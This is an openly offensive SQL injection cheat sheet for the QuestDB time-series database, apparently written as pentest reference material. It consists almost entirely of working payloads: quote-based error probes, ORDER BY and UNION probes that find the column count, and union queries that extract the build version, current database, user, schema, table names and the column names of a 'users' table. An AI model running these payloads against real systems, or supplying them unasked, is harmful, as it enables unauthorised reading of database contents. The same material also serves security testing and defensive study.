# QuestDB Injection (time series database):

#### add by Meisam Monsef 

## Comments:

    --comment (No space is needed)
    /*comment*/

## Testing Injection : 
        '
        1'  #  get error unclosed quoted string?

## Union Based:

        1' order by 100--                             #order column position is out of range [max=8]
        1' order by 8--                               #no error 
        1' union SELECT 1--                           #queries have different number of columns
        1' union SELECT 1,2,3,4,5,6,7,8--             #success
        1' union SELECT 1,2,3,4,5,6,7,8--             #error unsupported cast [column=8, from=INT, to=TIMESTAMP]
        1' union SELECT 1,2,3,4,5,6,7,null--          #success

## Version:

         1' union SELECT build(),2,3,4,5,6,7,null--'
         
## Get the current database:

         1' union SELECT current_database(),2,3,4,5,6,7,null--'

## Get the current user:

         1' union SELECT current_user(),2,3,4,5,6,7,null--'

## Get the current schema:

         1' union SELECT current_schema(),2,3,4,5,6,7,null--'

## Get All Tables:

        1' union SELECT table_name,2,3,4,5,6,7,null from tables()--'        #get all none WAL tables
        1' union SELECT table_name,2,3,4,5,6,7,null from all_tables()--'    #get all none WAL tables
        1' union SELECT name,2,3,4,5,6,7,null from wal_tables()--'          #get all WAL tables

## Get columns name for table:

        1' union SELECT column,2,3,4,5,6,7,null from table_columns('users')--'                   #get error table and column names that are SQL keywords
        1' union SELECT "column",2,3,4,5,6,7,null from table_columns('users')--'                 #success
        1' union SELECT string_agg("column",','),2,3,4,5,6,7,null from table_columns('users')--' #get all columns name
